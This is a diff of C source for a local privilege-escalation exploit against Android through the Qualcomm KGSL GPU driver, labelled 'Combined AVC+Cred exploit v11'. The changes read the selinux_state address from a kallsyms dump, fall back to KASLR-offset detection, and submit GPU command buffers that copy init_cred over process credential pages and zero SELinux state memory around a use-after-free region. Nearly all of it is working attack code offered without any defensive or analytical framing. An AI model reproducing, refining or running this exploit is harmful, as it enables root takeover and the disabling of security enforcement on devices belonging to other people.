@@ -96,33 +96,7 @@ static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int grou
     return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
 }
 
-static uint64_t read_kallsyms_symbol(const char *name) {
-    FILE *fp = fopen("/proc/kallsyms", "r");
-    if (!fp) return 0;
-    char line[256];
-    uint64_t addr = 0;
-    while (fgets(line, sizeof(line), fp)) {
-        char sym[64];
-        char type;
-        unsigned long long a;
-        if (sscanf(line, "%llx %c %63s", &a, &type, sym) == 3) {
-            if (strcmp(sym, name) == 0) {
-                addr = (uint64_t)a;
-                break;
-            }
-        }
-    }
-    fclose(fp);
-    return addr;
-}
-
 uint64_t get_kaslr_offset(void) {
-    uint64_t stext = read_kallsyms_symbol("_stext");
-    if (stext) {
-        int64_t kaslr = (int64_t)(stext - VMLINUX_TEXT);
-        kaslr &= ~0x1FFFFFLL;
-        return (uint64_t)kaslr;
-    }
     struct perf_event_attr pe = {0};
     pe.type = PERF_TYPE_HARDWARE;
     pe.size = sizeof(pe);
@@ -169,6 +143,41 @@ uint64_t get_kaslr_offset(void) {
     int64_t kaslr = (int64_t)(first_ip - VMLINUX_TEXT);
     kaslr &= ~0x1FFFFFLL;
     return (uint64_t)kaslr;
+}
+
+uint64_t get_selinux_state_from_file(void) {
+    const char *path = "/data/local/tmp/kallsyms.txt";
+    FILE *fp = fopen(path, "r");
+    if (!fp) {
+        printf("[-] Cannot open %s, using fallback\n", path);
+        uint64_t kaslr = get_kaslr_offset();
+        if (!kaslr) return 0;
+        int64_t ks = (int64_t)kaslr;
+        return (uint64_t)((int64_t)VMLINUX_SELINUX_STATE + ks);
+    }
+    char line[512];
+    uint64_t addr = 0;
+    while (fgets(line, sizeof(line), fp)) {
+        char sym[128];
+        char type;
+        unsigned long long a;
+        if (sscanf(line, "%llx %c %127s", &a, &type, sym) == 3) {
+            if (strcmp(sym, "selinux_state") == 0) {
+                addr = (uint64_t)a;
+                break;
+            }
+        }
+    }
+    fclose(fp);
+    if (!addr) {
+        printf("[-] selinux_state not found in kallsyms.txt, using fallback\n");
+        uint64_t kaslr = get_kaslr_offset();
+        if (!kaslr) return 0;
+        int64_t ks = (int64_t)kaslr;
+        return (uint64_t)((int64_t)VMLINUX_SELINUX_STATE + ks);
+    }
+    printf("[+] selinux_state address from file: 0x%lx\n", (unsigned long)addr);
+    return addr;
 }
 
 static volatile int dc_civac_works = -1;
@@ -237,21 +246,15 @@ int main(int argc, char **argv) {
     (void)argc;
     (void)argv;
     setbuf(stdout, NULL);
-    printf("[+] Combined AVC+Cred exploit v10 (aggressive SELinux zeroing)\n");
+    printf("[+] Combined AVC+Cred exploit v11 (kallsyms.txt based)\n");
 
-    uint64_t kaslr = get_kaslr_offset();
-    if (!kaslr) {
-        printf("[-] KASLR detection failed\n");
+    uint64_t selinux_state_addr = get_selinux_state_from_file();
+    if (!selinux_state_addr) {
+        printf("[-] Failed to get selinux_state address\n");
         return 1;
     }
-    int64_t kaslr_signed = (int64_t)kaslr;
-    uint64_t init_cred_addr = (uint64_t)((int64_t)VMLINUX_INIT_CRED + kaslr_signed);
-    uint64_t selinux_state_addr = (uint64_t)((int64_t)VMLINUX_SELINUX_STATE + kaslr_signed);
-    uint64_t enforcing_boot_addr = (uint64_t)((int64_t)VMLINUX_SELINUX_ENFORCING_BOOT + kaslr_signed);
-    printf("[*] KASLR: %ld (0x%lx)\n", kaslr_signed, (unsigned long)kaslr);
-    printf("[*] init_cred: 0x%lx\n", (unsigned long)init_cred_addr);
+
     printf("[*] selinux_state: 0x%lx\n", (unsigned long)selinux_state_addr);
-    printf("[*] enforcing_boot: 0x%lx\n", (unsigned long)enforcing_boot_addr);
 
     int start_pipe[2], done_pipe[2], setenforce_pipe[2];
     pipe(start_pipe); pipe(done_pipe); pipe(setenforce_pipe);
@@ -463,40 +466,48 @@ int main(int argc, char **argv) {
     }
     flush_cpu_cache((void*)UAF_ADDR, UAF_SIZE);
 
-    printf("[*] Phase 8: Overwrite cred pages with init_cred\n");
+    printf("[*] Phase 8: Overwrite cred pages with init_cred (if any)\n");
     if (n_cred > 0) {
-        for (int p = 0; p < n_cred && p < 32; p++) {
-            uint64_t cbase = cred_pages[p] + cred_offs[p];
-            uint32_t *cmd = (uint32_t *)ib_m;
-            int dw = 0;
-            memset(ib_m, 0, 0x10000);
-            memset(dst_m, 0, 0x1000);
+        uint64_t kaslr = get_kaslr_offset();
+        if (!kaslr) {
+            printf("[-] Failed to get KASLR for init_cred, skipping cred overwrite\n");
+        } else {
+            int64_t ks = (int64_t)kaslr;
+            uint64_t init_cred_addr = (uint64_t)((int64_t)VMLINUX_INIT_CRED + ks);
+            printf("[*] init_cred address: 0x%lx\n", (unsigned long)init_cred_addr);
+            for (int p = 0; p < n_cred && p < 32; p++) {
+                uint64_t cbase = cred_pages[p] + cred_offs[p];
+                uint32_t *cmd = (uint32_t *)ib_m;
+                int dw = 0;
+                memset(ib_m, 0, 0x10000);
+                memset(dst_m, 0, 0x1000);
 
-            cmd[dw++] = cp_type7(CP_NOP, 0);
-            for (int i = 0; i < CRED_COPY_SIZE/4; i++) {
-                uint32_t dl, dh, sl, sh;
-                split64(dst_ga + i*4, &dl, &dh);
-                split64(init_cred_addr + i*4, &sl, &sh);
-                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
-                cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
-                cmd[dw++] = sl; cmd[dw++] = sh;
+                cmd[dw++] = cp_type7(CP_NOP, 0);
+                for (int i = 0; i < CRED_COPY_SIZE/4; i++) {
+                    uint32_t dl, dh, sl, sh;
+                    split64(dst_ga + i*4, &dl, &dh);
+                    split64(init_cred_addr + i*4, &sl, &sh);
+                    cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+                    cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
+                    cmd[dw++] = sl; cmd[dw++] = sh;
+                }
+                for (int i = 0; i < CRED_COPY_SIZE/4; i++) {
+                    uint32_t dl, dh, sl, sh;
+                    split64(cbase + i*4, &dl, &dh);
+                    split64(dst_ga + i*4, &sl, &sh);
+                    cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+                    cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
+                    cmd[dw++] = sl; cmd[dw++] = sh;
+                }
+                cmd[dw++] = cp_type7(CP_NOP, 0);
+                __sync_synchronize();
+                unsigned int ts;
+                if (submit_ib(kgsl_fd, ctx, ib_ga, dw*4, ib_id, &ts) == 0)
+                    wait_timestamp(kgsl_fd, ctx, ts);
             }
-            for (int i = 0; i < CRED_COPY_SIZE/4; i++) {
-                uint32_t dl, dh, sl, sh;
-                split64(cbase + i*4, &dl, &dh);
-                split64(dst_ga + i*4, &sl, &sh);
-                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
-                cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
-                cmd[dw++] = sl; cmd[dw++] = sh;
-            }
-            cmd[dw++] = cp_type7(CP_NOP, 0);
-            __sync_synchronize();
-            unsigned int ts;
-            if (submit_ib(kgsl_fd, ctx, ib_ga, dw*4, ib_id, &ts) == 0)
-                wait_timestamp(kgsl_fd, ctx, ts);
+            flush_cpu_cache((void*)UAF_ADDR, UAF_SIZE);
+            printf("  Cred overwrite done\n");
         }
-        flush_cpu_cache((void*)UAF_ADDR, UAF_SIZE);
-        printf("  Cred overwrite done\n");
     }
 
     printf("[*] Phase 9: Aggressive SELinux state zeroing (0x0..0x100)\n");
@@ -507,15 +518,6 @@ int main(int argc, char **argv) {
         cmd[dw++] = cp_type7(CP_NOP, 0);
         for (int off = 0; off < 0x100; off++) {
             uint64_t addr = selinux_state_addr + off;
-            uint32_t al, ah;
-            split64(addr, &al, &ah);
-            cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
-            cmd[dw++] = al;
-            cmd[dw++] = ah;
-            cmd[dw++] = 0;
-        }
-        for (int off = 0; off < 0x100; off++) {
-            uint64_t addr = enforcing_boot_addr + off;
             uint32_t al, ah;
             split64(addr, &al, &ah);
             cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
